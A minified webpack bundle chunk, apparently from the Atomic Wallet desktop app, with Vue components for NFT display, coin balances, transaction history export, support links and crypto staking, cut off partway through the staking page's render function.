(window.webpackJsonp = window.webpackJsonp || []).push([
    [159], {
        1657: function (t, e, i) {
            "use strict";
            i.d(e, "a", (function () {
                return Article
            }));
            var s = i(18),
                a = i.n(s);
            class Article {
                constructor(t) {
                    var e;
                    a()(this, "id", void 0), a()(this, "preview", void 0), a()(this, "url", void 0), a()(this, "description", void 0), Object.assign(this, {
                        raw: t,
                        url: t.contentUrl,
                        preview: null === (e = t.previewUrl) || void 0 === e ? void 0 : e.desktop,
                        description: t.title
                    })
                }
                get isYoutube() {
                    return this.url.toLowerCase().includes("youtu")
                }
            }
        },
        1661: function (t, e, i) {
            "use strict";
            e.a = {
                methods: {
                    $address(t) {
                        const {
                            address: e = null
                        } = this.$wallets.getWallet(t);
                        return e
                    }
                }
            }
        },
        1662: function (t, e, i) {
            "use strict";
            var s = i(24),
                a = i(893),
                n = i(10),
                o = i(393),
                r = {
                    name: "NFT",
                    components: {
                        NFTInfo: o.c,
                        NFTEmpty: o.a,
                        NFTGallery: o.b,
                        NFTReceive: o.d,
                        NFTSendToken: o.e
                    },
                    data: () => ({
                        isLoading: !0,
                        selectedNFT: null,
                        showInfoPopup: !1,
                        showReceivePopup: !1,
                        showSendPopup: !1
                    }),
                    computed: {
                        ...Object(n.c)(["allNft"]),
                        isOpenPopup() {
                            return !0 === this.showInfoPopup || !0 === this.showReceivePopup || !0 === this.showSendPopup
                        }
                    },
                    mounted() {
                        this.setNFT({
                            isInitUpdate: !0,
                            isStopUpdate: !1
                        }), this.isLoading = !1, this.$bus.$on("update::nft::list::wallet", this.setNFT)
                    },
                    beforeDestroy() {
                        this.setNFT({
                            isInitUpdate: !1,
                            isStopUpdate: !0
                        }), this.$bus.$off("update::nft::list::wallet", this.setNFT)
                    },
                    methods: {
                        ...Object(n.b)(["setNFT"]),
                        closeAll() {
                            this.showSendPopup = !1, this.showInfoPopup = !1
                        },
                        toggleReceivePopup() {
                            this.showReceivePopup = !this.showReceivePopup
                        },
                        toggleSendPopup() {
                            this.showSendPopup = !this.showSendPopup
                        },
                        toggleInfo(t) {
                            t && (this.selectedNFT = this.allNft.find(({
                                id: e
                            }) => e === t), this.showInfoPopup = !0)
                        }
                    }
                },
                c = i(1),
                l = Object(c.a)(r, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", [!t.isOpenPopup && t.allNft.length ? i("NFTGallery", {
                        attrs: {
                            nfts: t.allNft,
                            "data-test-id": "nft_gallery"
                        },
                        on: {
                            toggleInfo: t.toggleInfo,
                            toggleReceivePopup: t.toggleReceivePopup
                        }
                    }) : t._e(), t._v(" "), t.isOpenPopup || 0 !== t.allNft.length ? t._e() : i("NFTEmpty", {
                        attrs: {
                            isLoading: t.isLoading,
                            "data-test-id": "nft_empty"
                        },
                        on: {
                            openReceivePopup: t.toggleReceivePopup
                        }
                    }), t._v(" "), t.showInfoPopup ? i("NFTInfo", {
                        attrs: {
                            nft: t.selectedNFT,
                            "data-test-id": "nft_info"
                        },
                        on: {
                            onShowSendPopup: t.toggleSendPopup,
                            onClose: function (e) {
                                t.showInfoPopup = !1
                            }
                        }
                    }) : t._e(), t._v(" "), t.showReceivePopup ? i("NFTReceive", {
                        on: {
                            onClose: t.toggleReceivePopup
                        }
                    }) : t._e(), t._v(" "), t.showSendPopup ? i("NFTSendToken", {
                        attrs: {
                            token: t.selectedNFT
                        },
                        on: {
                            close: t.toggleSendPopup,
                            closeAll: t.closeAll
                        }
                    }) : t._e()], 1)
                }), [], !1, null, null, null).exports,
                d = i(1666),
                h = i(1680),
                u = i(1664);
            var p = {
                    name: "MainPage",
                    components: {
                        RefreshButton: h.a,
                        TableCoins: d.a,
                        TokenAddTabs: u.a
                    },
                    data() {
                        return {
                            connectionMessage: "",
                            showTokenPopup: !1,
                            coinTokenPopup: this.$wallets.getWallet("ETH", "atomic"),
                            isEditToken: !1,
                            isLoading: !1,
                            updateBalancesTimeout: null,
                            updateTransactionsTimeout: null
                        }
                    },
                    computed: {
                        ...Object(n.c)(["fiatRate", "isUpdatingFiat", "alwaysExcludedCoins"])
                    },
                    async beforeMount() {
                        if (!localStorage.getItem("WALLET_EXCLUDED_COINS")) {
                            const t = this.$wallets.getHiddenWallets().map(({
                                id: t
                            }) => t).concat(this.alwaysExcludedCoins);
                            this.setWalletExcludedCoins(t)
                        }
                        if (this.$route.query && this.$route.query.initAutoUpdates) {
                            const {
                                doNotCheckActivation: t
                            } = this.$route.query;
                            setTimeout(() => {
                                this.$wallets.initUpdateBalances(t), this.$wallets.initUpdateTransactions(t), this.setNFT({
                                    isInitUpdate: !0,
                                    isStopUpdate: !0
                                })
                            }, 3e3)
                        } else this.updateBalancesTimeout = setTimeout(() => {
                            this.updateBalances()
                        }, 3e3);
                        this.$bus.$on("load_rates_finish", this.loadRatesFinishHandler)
                    },
                    beforeDestroy() {
                        clearTimeout(this.updateBalancesTimeout), clearTimeout(this.updateTransactionsTimeout), this.$bus.$off("load_rates_start", this.loadRatesStartHandler), this.$bus.$off("load_rates_finish", this.loadRatesFinishHandler), this.$bus.$off("update::main", this.$forceUpdate), this.$bus.$off("connection_established", this.connectionHandler)
                    },
                    created() {
                        this.$bus.$on("update::main", this.$forceUpdate), this.$bus.$on("load_rates_start", this.loadRatesStartHandler), this.$bus.$on("connection_established", this.connectionHandler)
                    },
                    methods: {
                        ...Object(n.b)(["setNFT", "updateRates", "setWalletExcludedCoins"]),
                        connectionHandler(t) {
                            this.connectionMessage = t, setTimeout(() => {
                                this.connectionMessage = ""
                            }, 3e3)
                        },
                        loadRatesStartHandler(t) {
                            this.isLoading = !0, this.getRatesFromDb(t), this.fetchRatesFromNet()
                        },
                        loadRatesFinishHandler() {
                            this.isLoading = !1
                        },
                        editToken(t) {
                            this.showTokenPopup = !0, "" !== t && (this.isEditToken = !0, this.coinTokenPopup = t)
                        },
                        toggleTokenPopup() {
                            this.showTokenPopup = !this.showTokenPopup
                        },
                        closeTokenPopup() {
                            this.showTokenPopup = !1, this.isEditToken = !1, this.coinTokenPopup = this.$wallets.getWallet("ETH", "atomic")
                        },
                        async updateBalances(t = !1) {
                            this.isLoading || (this.isLoading = !0, await this.$wallets.updateBalances(), t && this.$ga.event("User Actions", "Update balance", {
                                clientID: this.$ga.customParams.uid
                            }), this.isLoading = !1)
                        },
                        async getRatesFromDb(t) {
                            const e = this.$wallets.getTickers(),
                                i = await this.$rates.getRatesFromDb(t);
                            let s = {
                                [this.fiatRate]: {}
                            };
                            i.forEach(({
                                ticker: t,
                                fiat: i,
                                rate: a,
                                change: n,
                                supply: o,
                                volume: r,
                                marketCap: c,
                                historyData: l
                            }) => {
                                let d = [];
                                if ("TRX-USDT" !== t && "TRX" !== t || (d[0] = t), "TRX-USDT" === t ? d[1] = "USDT" : d = e.filter(e => e === t), i === this.fiatRate)
                                    for (let t = 0; t < d.length; t += 1) {
                                        const e = this.$wallets.findWallet(d[t]);
                                        if (!e) return;
                                        const i = e.divisibleBalance * a;
                                        e.fiatBalance = i, s[this.fiatRate][e.ticker] = Object.freeze({
                                            rate: a,
                                            supply: o,
                                            volume: r,
                                            change: n,
                                            balance: i,
                                            marketCap: c
                                        })
                                    }
                            }), this.updateRates(s), this.$bus.$emit("update::fiat-balance")
                        },
                        async fetchRatesFromNet() {
                            await this.$rates.getRates(Array.from(this.$wallets)), this.getRatesFromDb()
                        }
                    }
                },
                m = Object(c.a)(p, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", [i("TableCoins", {
                        on: {
                            editToken: t.editToken
                        }
                    }), t._v(" "), i("div", {
                        staticClass: "add-token",
                        on: {
                            click: t.toggleTokenPopup
                        }
                    }, [t._v("\n    +\n  ")]), t._v(" "), i("RefreshButton", {
                        staticClass: "left-position",
                        class: {
                            updating: t.isUpdatingFiat && t.isLoading
                        },
                        on: {
                            refreshFinished: function (e) {
                                return t.updateBalances(!0)
                            }
                        }
                    }), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade-down"
                        }
                    }, [t.connectionMessage ? i("div", {
                        staticClass: "connection-notify"
                    }, [i("span", [t._v("\n        " + t._s(t.connectionMessage) + "\n      ")])]) : t._e()]), t._v(" "), i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "page-fade"
                        }
                    }, [t.showTokenPopup ? i("TokenAddTabs", {
                        attrs: {
                            coin: t.coinTokenPopup,
                            isEditToken: t.isEditToken
                        },
                        on: {
                            closeTokenPopup: t.closeTokenPopup
                        }
                    }) : t._e()], 1)], 1)
                }), [], !1, null, null, null).exports,
                g = i(70),
                v = i(891),
                f = i(5),
                b = i(152),
                w = i(266),
                T = i(640),
                y = i(634),
                C = i(636),
                x = i(1681),
                _ = i(1682),
                k = i(633);
            var S = {
                    name: "HistoryPage",
                    components: {
                        Table: b.a,
                        Search: w.a,
                        BuyBitcoin: T.a,
                        FilterPopup: y.a,
                        FilterButton: C.a,
                        ExportButton: x.a,
                        SuccessIconBig: _.a,
                        HistoryTableRow: k.a
                    },
                    mixins: [f.j],
                    data: () => ({
                        txs: [],
                        isEmpty: !0,
                        filter: "",
                        settingsState: !1,
                        page: 1,
                        updater: null,
                        isSavedTransactionPopup: !1,
                        header: [{
                            slot: "header-row-1"
                        }, {
                            slot: "header-row-2"
                        }]
                    }),
                    computed: {
                        ...Object(n.c)(["historyExcludedCoins", "historyExcludedDirections", "historyExcludedTypes"]),
                        highlightSetting() {
                            return this.historyExcludedCoins.length > 0 || this.historyExcludedDirections.length > 0 || this.historyExcludedTypes.length > 0
                        },
                        transactions() {
                            const t = this.filter.toLowerCase(),
                                e = this.txs.filter(({
                                    amount: t
                                }) => "0" !== t).sort((t, e) => t.txType > e.txType ? 1 : -1).sort((t, e) => e.datetime.getTime() > t.datetime.getTime() ? 1 : -1),
                                i = Object(v.a)(e, t => {
                                    const e = new Date(t.datetime) > Date.now(),
                                        i = t.direction ? "Received" : "Sent",
                                        s = this.historyExcludedCoins.indexOf(t.walletid) >= 0,
                                        a = this.historyExcludedDirections.indexOf(i) >= 0,
                                        n = this.historyExcludedTypes.indexOf(t.title) >= 0;
                                    return !(e || s || a || n)
                                }),
                                s = Object(v.a)(i, e => 0 === t.length || (e.ticker.toLowerCase().indexOf(t) >= 0 || e.name.toLowerCase().indexOf(t) >= 0));
                            return s.length > 20 ? s.slice(0, 20 * this.page) : s
                        },
                        coinsInvolvedInHistory() {
                            const t = [...new Set(this.$wallets.transactions.map(t => t.ticker))];
                            return Array.from(this.$wallets).filter(e => -1 !== t.indexOf(e.ticker))
                        }
                    },
                    watch: {
                        txs(t) {
                            this.isEmpty = 0 === t.length
                        }
                    },
                    beforeMount() {
                        this.updateHistory(), this.refreshHistory(!0)
                    },
                    mounted() {
                        this.$bus.$on("socket::newtx", this.updateHistory), this.$bus.$on("socket::newtx::outgoing", this.updateHistory), this.$bus.$on("socket::tx::confirmed", this.loadTxs)
                    },
                    beforeDestroy() {
                        this.$bus.$off("socket::newtx", this.updateHistory), this.$bus.$off("socket::newtx::outgoing", this.updateHistory), this.$bus.$off("socket::tx::confirmed", this.loadTxs), clearTimeout(this.updater)
                    },
                    methods: {
                        ...Object(n.b)(["setHistoryExcludedCoins", "setHistoryExcludedTypes", "setHistoryExcludedDirections"]),
                        exportHistory() {
                            const t = this.txs.map(t => {
                                    let e = "-",
                                        i = "-";
                                    try {
                                        const s = this.$wallets.getWallet(null == t ? void 0 : t.parent),
                                            {
                                                explorer: a
                                            } = s,
                                            {
                                                webUrl: n
                                            } = a;
                                        i = this.$wallets.getWallet(t.walletid).address, e = n && t.txid ? `${n}${t.txid}` : "-"
                                    } catch (t) {
                                        console.warn(t)
                                    }
                                    const s = i || "-",
                                        a = t.direction;
                                    return {
                                        DATE: new Intl.DateTimeFormat("en-GB", {
                                            dateStyle: "long",
                                            timeStyle: "long"
                                        }).format(t.datetime),
                                        TYPE: t.txType || "-",
                                        OUTAMOUNT: a ? "-" : t.amount,
                                        OUTCURRENCY: a ? "-" : t.ticker,
                                        FEEAMOUNT: t.fee,
                                        FEECURRENCY: t.feeTicker,
                                        OUTTXID: a ? t.otherSideAddress : s,
                                        OUTTXURL: e || "-",
                                        INAMOUNT: a ? t.amount : "-",
                                        INCURRENCY: a ? t.ticker : "-",
                                        INTXID: a ? s : t.otherSideAddress,
                                        INTXURL: a && e || "-",
                                        ORDERID: t.txid,
                                        ADDRESSTO: a ? s : t.otherSideAddress
                                    }
                                }),
                                e = `"${Object.keys(t[0]).join('";"')}"\n      ${t.map(t=>`"${Object.values(t).join('";"')}"`).join("\n")}`,
                                i = `history-atomicwallet-${this.$moment(new Date).format("DD.MM.YYYY")}.csv`;
                            g.ipcRenderer.send("exportTransactions", {
                                fileName: i,
                                body: e
                            }), g.ipcRenderer.on("exportTransactions", (t, e) => {
                                e && console.log("File save error", e), t && (this.isSavedTransactionPopup = !0)
                            })
                        },
                        acceptFilter(t) {
                            this.setHistoryExcludedCoins(t.excludedCoins), this.setHistoryExcludedTypes(t.types), this.setHistoryExcludedDirections(t.directions), this.settingsState = !1
                        },
                        async refreshHistory(t) {
                            const e = await this.$history.selectTransactions().catch(console.log);
                            this.$wallets.loadTransactions(e), this.updateHistory(), t && (this.updater = setTimeout(() => {
                                this.refreshHistory()
                            }, 15e3))
                        },
                        async loadTxs(t) {
                            const {
                                ticker: e = null
                            } = t, i = e || t, s = await this.$history.selectTransactions({
                                ticker: i
                            });
                            this.$wallets.loadTransactions(s), this.updateHistory()
                        },
                        async updateHistory() {
                            this.txs = Object.freeze(this.$wallets.transactions.map(t => Object.freeze(t))), setTimeout(() => {
                                this.txs = Object.freeze(this.$wallets.transactions.map(t => Object.freeze(t)))
                            }, 5e3)
                        },
                        handleScrollEnd(t) {
                            t.target.scrollHeight - (t.target.offsetHeight + t.target.scrollTop) > 100 || this.txs.length >= 20 * this.page && (this.page += 1)
                        }
                    }
                },
                $ = Object(c.a)(S, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "history scroll-list2",
                        on: {
                            scroll: t.handleScrollEnd
                        }
                    }, [i("Search", {
                        staticClass: "history-search-fix",
                        model: {
                            value: t.filter,
                            callback: function (e) {
                                t.filter = e
                            },
                            expression: "filter"
                        }
                    }), t._v(" "), t.settingsState ? t._e() : i("Table", {
                        attrs: {
                            filter: t.filter,
                            header: t.header,
                            isEmpty: t.isEmpty,
                            items: t.transactions
                        }
                    }, [t.filter.length && !t.transactions.length ? i("div", {
                        attrs: {
                            slot: "empty"
                        },
                        slot: "empty"
                    }, [i("div", {
                        staticClass: "empty"
                    }, [t._v("\n        No results found for “" + t._s(t.filter) + "”\n      ")])]) : t._e(), t._v(" "), i("FilterButton", {
                        attrs: {
                            slot: "header-row-2",
                            active: t.settingsState,
                            highlight: t.highlightSetting
                        },
                        on: {
                            click: function (e) {
                                t.settingsState = !t.settingsState
                            }
                        },
                        slot: "header-row-2"
                    }), t._v(" "), i("ExportButton", {
                        attrs: {
                            slot: "header-row-2"
                        },
                        on: {
                            click: t.exportHistory
                        },
                        slot: "header-row-2"
                    }), t._v(" "), t._l(t.transactions, (function (e, s) {
                        return i("HistoryTableRow", {
                            key: "row-" + s + "-" + Math.random(),
                            attrs: {
                                slot: "table-rows",
                                indexTx: s,
                                openedIds: t.openedIds,
                                tx: e
                            },
                            on: {
                                addOpenedId: t.addOpenedId,
                                removeOpenedId: t.removeOpenedId
                            },
                            slot: "table-rows"
                        })
                    }))], 2), t._v(" "), t.filter.length || t.transactions.length ? t._e() : i("BuyBitcoin", {
                        attrs: {
                            name: "transactions"
                        }
                    }), t._v(" "), t.isSavedTransactionPopup ? i("div", {
                        staticClass: "saved-transaction popup fixed"
                    }, [i("div", {
                        staticClass: "popup-background",
                        on: {
                            click: function (e) {
                                t.isSavedTransactionPopup = !1
                            }
                        }
                    }), t._v(" "), i("div", {
                        staticClass: "popup-wrap"
                    }, [i("div", {
                        staticClass: "success-icon"
                    }, [i("SuccessIconBig")], 1), t._v(" "), i("div", {
                        staticClass: "text-title"
                    }, [t._v("\n        Transactions are saved to your Desktop folder.\n      ")]), t._v(" "), i("button", {
                        staticClass: "button uppercase",
                        on: {
                            click: function (e) {
                                t.isSavedTransactionPopup = !1
                            }
                        }
                    }, [t._v("\n        Close\n      ")])])]) : t._e(), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [t.settingsState ? i("FilterPopup", {
                        attrs: {
                            coins: t.coinsInvolvedInHistory,
                            directions: !0,
                            module: "history"
                        },
                        on: {
                            acceptFilter: t.acceptFilter,
                            close: function (e) {
                                t.settingsState = !1
                            }
                        }
                    }) : t._e()], 1)], 1)
                }), [], !1, null, null, null).exports,
                E = (i(596), {
                    name: "Support",
                    mixins: [f.p],
                    data: () => ({
                        enableMonitoring: !0,
                        copied: !1
                    }),
                    computed: {
                        truncateHashId() {
                            return `${this.$wallets.hash.substring(0,20)}...${this.$wallets.hash.substring(this.$wallets.hash.length-20)}`
                        }
                    },
                    watch: {
                        enableMonitoring(t) {
                            localStorage.setItem("isMonitoringEnabled", t)
                        }
                    },
                    beforeMount() {
                        const t = localStorage.getItem("isMonitoringEnabled");
                        this.enableMonitoring = !t || /true/i.test(t)
                    },
                    methods: {
                        copyID() {
                            this.$electron.clipboard.writeText(this.$wallets.hash), this.copied = !0;
                            setTimeout(() => {
                                this.copied = !1
                            }, 1e3)
                        }
                    }
                }),
                A = Object(c.a)(E, (function () {
                    var t = this,
                        e = t.$createElement,
                        s = t._self._c || e;
                    return s("main", [s("div", {
                        staticClass: "support"
                    }, [s("div", {
                        staticClass: "title"
                    }, [t._v("\n      Atomic Wallet Support\n    ")]), t._v(" "), s("p", {
                        staticClass: "support__text"
                    }, [t._v("\n      Update your wallet to the latest version:\n    ")]), s("a", {
                        staticClass: "hover",
                        attrs: {
                            "data-test-id": "support_download_link"
                        },
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://atomicwallet.io/downloads")
                            }
                        }
                    }, [t._v("atomicwallet.io/downloads")]), t._v(" "), s("div", {
                        staticClass: "row"
                    }, [s("a", {
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://support.atomicwallet.io")
                            }
                        }
                    }, [s("img", {
                        attrs: {
                            src: i(1582)
                        }
                    }), t._m(0)]), s("a", {
                        on: {
                            click: function (e) {
                                return t.writeMail("", "")
                            }
                        }
                    }, [s("img", {
                        attrs: {
                            src: i(1576)
                        }
                    }), t._m(1)]), s("a", {
                        on: {
                            click: function (e) {
                                return t.$bus.$emit("openSupportPopup")
                            }
                        }
                    }, [s("img", {
                        attrs: {
                            src: i(1574)
                        }
                    }), t._m(2)]), s("a", {
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://www.youtube.com/atomicwallet")
                            }
                        }
                    }, [s("img", {
                        attrs: {
                            src: i(1584)
                        }
                    }), t._m(3)])]), t._v(" "), s("div", {
                        staticClass: "social-networks"
                    }, [s("p", {
                        staticClass: "support__text"
                    }, [t._v("\n        Check out our social media\n      ")]), s("a", {
                        attrs: {
                            "data-test-id": "support_telegram_link"
                        },
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://t.me/AtomicWalletNews")
                            }
                        }
                    }, [s("icon", {
                        attrs: {
                            name: "telegram"
                        }
                    })], 1), s("a", {
                        attrs: {
                            "data-test-id": "support_reddit_link"
                        },
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://www.reddit.com/r/atomicwallet/")
                            }
                        }
                    }, [s("icon", {
                        attrs: {
                            name: "reddit"
                        }
                    })], 1), s("a", {
                        attrs: {
                            "data-test-id": "support_twitter_link"
                        },
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://twitter.com/atomicwallet")
                            }
                        }
                    }, [s("icon", {
                        attrs: {
                            name: "twitter"
                        }
                    })], 1), s("a", {
                        attrs: {
                            "data-test-id": "support_facebook_link"
                        },
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://www.facebook.com/atomicwallet")
                            }
                        }
                    }, [s("icon", {
                        attrs: {
                            name: "facebook"
                        }
                    })], 1)]), t._v(" "), s("p", {
                        staticClass: "support__text cursor",
                        on: {
                            click: t.copyID
                        }
                    }, [t._v("\n      Anonymous Atomic ID\n    ")]), t._v(" "), s("div", {
                        staticClass: "copy-wrap"
                    }, [s("a", {
                        attrs: {
                            "data-test-id": "support_atomic_id"
                        },
                        on: {
                            click: t.copyID
                        }
                    }, [t._v("\n        " + t._s(t.truncateHashId) + "\n      ")]), t._v(" "), s("div", {
                        staticClass: "icon-copy",
                        on: {
                            click: t.copyID
                        }
                    })]), t._v(" "), s("div", {
                        staticClass: "relative"
                    }, [s("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [t.copied ? s("div", {
                        staticClass: "message"
                    }, [t._v("\n          Atomic ID copied to clipboard\n        ")]) : t._e()])], 1), t._v(" "), s("div", {
                        staticClass: "enable-logs"
                    }, [s("label", {
                        staticClass: "checkbox",
                        attrs: {
                            "data-test-id": "support_enable_logs"
                        }
                    }, [s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: t.enableMonitoring,
                            expression: "enableMonitoring"
                        }],
                        attrs: {
                            type: "checkbox"
                        },
                        domProps: {
                            checked: Array.isArray(t.enableMonitoring) ? t._i(t.enableMonitoring, null) > -1 : t.enableMonitoring
                        },
                        on: {
                            change: function (e) {
                                var i = t.enableMonitoring,
                                    s = e.target,
                                    a = !!s.checked;
                                if (Array.isArray(i)) {
                                    var n = t._i(i, null);
                                    s.checked ? n < 0 && (t.enableMonitoring = i.concat([null])) : n > -1 && (t.enableMonitoring = i.slice(0, n).concat(i.slice(n + 1)))
                                } else t.enableMonitoring = a
                            }
                        }
                    }), s("span", [t._v("\n          Enable log collection\n        ")]), t._v(" "), t._m(4)])])])])
                }), [function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("span", [this._v("\n        Knowledge"), e("br"), this._v("Base\n      ")])
                }, function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("span", [this._v("\n        Email"), e("br"), this._v("Support\n      ")])
                }, function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("span", [this._v("\n        Contact"), e("br"), this._v("Support\n      ")])
                }, function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("span", [this._v("\n        Video"), e("br"), this._v("Tutorials\n      ")])
                }, function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "state tooltip-hover"
                    }, [e("img", {
                        staticClass: "icon",
                        attrs: {
                            src: "static/img/icon-faq.png"
                        }
                    }), this._v(" "), e("div", {
                        staticClass: "tooltip"
                    }, [this._v("\n            Atomic Wallet will automatically collect error details to improve your experience."), e("br"), this._v("We respect your\n            privacy, so this data is fully anonymous and will help our support"), e("br"), this._v("\n            team resolve any issues you may encounter."), e("br"), this._v("\n            If you still prefer not to share your data, disable this option.\n          ")])])
                }], !1, null, null, null).exports,
                P = i(105),
                R = i.n(P),
                I = i(26),
                F = i.n(I),
                N = i(47),
                D = i(1683),
                B = i(1684),
                W = i(1685),
                O = i(1686),
                L = i(1687),
                M = i(1688),
                H = i(638),
                U = i(629),
                j = i(637),
                K = i(639),
                V = i(382),
                q = i(1689);
            const G = {
                    ONT: "ONG",
                    NEO: "GAS",
                    VET: "VTHO",
                    WINK: "WIN"
                },
                Y = ["VET", "ALGO", "KMD", "NEO"],
                X = ["WIN", "JST"];
            var z = {
                    name: "StakingPage",
                    components: {
                        Table: b.a,
                        CoinIcon: N.a,
                        StakingEmpty: D.a,
                        StakingPopupSOL: H.a,
                        StakingPopupNEO: W.a,
                        StakingPopupONT: O.a,
                        StakingPopupVET: L.a,
                        StakingPopupKMD: B.a,
                        StakingPopupALGO: M.a,
                        StakingPopupZIL: U.a,
                        StakingPopupBNB: j.a,
                        StakingPopupNEAR: K.a,
                        StakingPopupTabs: V.a,
                        StakingPopupNotFound: q.a
                    },
                    mixins: [f.o],
                    data: () => ({
                        isStakingExchangePopup: !1,
                        activeStaking: null,
                        currentComponentName: "",
                        coin: null,
                        header: [{
                            title: "Assets for stake",
                            key: "name"
                        }, {
                            title: "Available",
                            key: "balance"
                        }, {
                            title: "Staked",
                            key: "staked"
                        }, {
                            title: "Value",
                            key: "fiatBalance"
                        }, {
                            title: "Yearly yield",
                            key: "reward"
                        }],
                        activeSortField: "",
                        isSortASC: !1,
                        getNearBalancesTimeout: null
                    }),
                    computed: {
                        ...Object(n.c)(["fiatRate", "coinRate", "fiatCharacter", "balanceSummary", "stakingSettings"]),
                        isEmptyScreen() {
                            return 0 === Number(this.balanceSummary(this.fiatRate))
                        },
                        trxBalance() {
                            const {
                                balances: {
                                    total: t
                                }
                            } = this.$wallets.getWallet("TRX", "atomic"), e = localStorage.getItem("TRX-balance");
                            return Number(t) || Number(e) || 0
                        },
                        solStaked() {
                            const t = this.$wallets.findWallet("SOL"),
                                {
                                    total: e = 0,
                                    staking: i
                                } = (null == t ? void 0 : t.balances) || {};
                            return i ? i.reduce((e, i) => i.isAvailableForWithdraw || i.isDeactivated ? e : e.add(new t.BN(i.staked)), new t.BN("0")) : e
                        },
                        tableItems() {
                            const t = this.stakingSettings.map(({
                                ticker: t,
                                name: e,
                                reward: i,
                                displayTicker: s,
                                tags: a = [],
                                emptyTag: n = null,
                                isDefaultBuyCrypto: o = !1
                            }) => {
                                const r = this.$wallets.findWallet(t);
                                let c = "0",
                                    l = "0",
                                    d = "0",
                                    h = t;
                                if (r) {
                                    const e = localStorage.getItem(t + "-balance"),
                                        i = this.coinRate(this.fiatRate, r).rate,
                                        s = Number(r.divisibleBalance) || Number(e) || 0;
                                    if (c = ["ZIL", "ATOM", "BAND", "SOL"].includes(t) ? r.balances && r.balances.availableForStake || "0" : r.balances && r.balances.available || Number(s.toFixed(this.getFixedNumber(s, t))).toString(), l = this.$options.filters.formatFiat(new F.a(i).multipliedBy(c)), X.includes(t)) d = this.trxBalance, h = "TRX";
                                    else if (Y.includes(t)) d = c;
                                    else {
                                        const {
                                            staking: t = null,
                                            frozen: e = null
                                        } = r.balances || {};
                                        d = t && t.total || e || "0"
                                    } ["ZIL", "ADA", "NEAR", "BNB"].includes(t) && (d = r.toCurrencyUnit(d)), ["SOL"].includes(t) && (d = r.toCurrencyUnit(this.solStaked)), d = Number(Number(d).toFixed(this.getFixedNumber(Number(d), h))).toString()
                                }
                                return {
                                    icon: `${this.$iconClass(t)} icon-${t.toLowerCase()}`,
                                    iconTicker: t,
                                    ticker: "WIN" === t ? "WINK" : t,
                                    walletInstance: r,
                                    name: e,
                                    reward: i,
                                    staked: d,
                                    balance: c,
                                    fiatBalance: l,
                                    tickerStaked: h,
                                    displayTicker: s,
                                    tags: a,
                                    emptyTag: n,
                                    isDefaultBuyCrypto: o
                                }
                            });
                            return this.activeSortField ? this.isSortASC ? R()(t).asc(t => Number(t[this.activeSortField])) : R()(t).desc(t => Number(t[this.activeSortField])) : t
                        }
                    },
                    async beforeMount() {
                        const t = this.$router.currentRoute.params.ticker && this.$router.currentRoute.params.ticker.toUpperCase();
                        if (t) {
                            const e = this.tableItems.find(e => e.ticker === t || G[e.ticker] === t);
                            this.openStakingPopup(e)
                        }
                        this.stakingSettings.find(({
                            ticker: t
                        }) => "NEAR" === t) && (await this.fetchNearBalances(), this.$bus.$on("get-near-balances", this.getNearBalances))
                    },
                    beforeDestroy() {
                        clearTimeout(this.getNearBalancesTimeout), this.$bus.$off("get-near-balances", this.getNearBalances)
                    },
                    methods: {
                        async getNearBalances() {
                            const t = this.$wallets.findWallet("NEAR");
                            t && await t.getStakingInfo()
                        },
                        async fetchNearBalances() {
                            clearTimeout(this.getNearBalancesTimeout), await this.getNearBalances(), this.getNearBalancesTimeout = setTimeout(() => this.getNearBalances(), 6e4)
                        },
                        getFixedNumber(t, e) {
                            let i = 6;
                            return t > 1 && (i = "BTT" === e || "WIN" === e ? 2 : 4), i
                        },
                        openStakingPopup(t) {
                            ["ATOM", "XTZ", "TRX", "AWC-986", "BAND", "ADA", "ZIL", "ICX", "SOL", "NEAR", "BNB"].includes(t.ticker) ? (this.currentComponentName = "StakingPopupTabs", this.coin = this.$wallets.getWallet(t.ticker) || this.$wallets.findWallet(t.ticker, "atomic")) : this.currentComponentName = "StakingPopup" + t.ticker, this.$options.components[this.currentComponentName] || (this.currentComponentName = "StakingPopupNotFound"), this.activeStaking = t, this.toggleStakingExchangePopup()
                        },
                        closeExchangePopup() {
                            this.isStakingExchangePopup = !1
                        },
                        toggleStakingExchangePopup() {
                            this.isStakingExchangePopup = !this.isStakingExchangePopup, this.closeStakingPopup()
                        },
                        sortByField(t) {
                            this.activeSortField === t ? this.isSortASC = !this.isSortASC : (this.activeSortField = t, this.isSortASC = !0)
                        }
                    }
                },
                J = Object(c.a)(z, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "staking scroll-list2",
                        attrs: {
                            "data-test-id": "coin_staking_info"
                        }
                    }, [t.isStakingExchangePopup ? i(t.currentComponentName, {
                        tag: "component",
                        attrs: {
                            coin: t.coin,
                            staking: t.activeStaking
                        },
                        on: {
                            closePopup: t.closeExchangePopup
                        }
                    }) : t.isEmptyScreen ? i("StakingEmpty", {
                        attrs: {
                            items: t.tableItems
                        },
                        on: {
                            openStakingPopup: t.openStakingPopup
                        }
                    }) : i("Table", {
                        attrs: {
                            activeSortField: t.activeSortField,
                            header: t.header,
                            isEmpty: !1,
                            isSortASC: t.isSortASC,
                            isSortable: !0,
                            items: t.tableItems
                        },
                        on: {
                            sortByField: t.sortByField
                        }
                    }, t._l(t.tableItems, (function (e, s) {
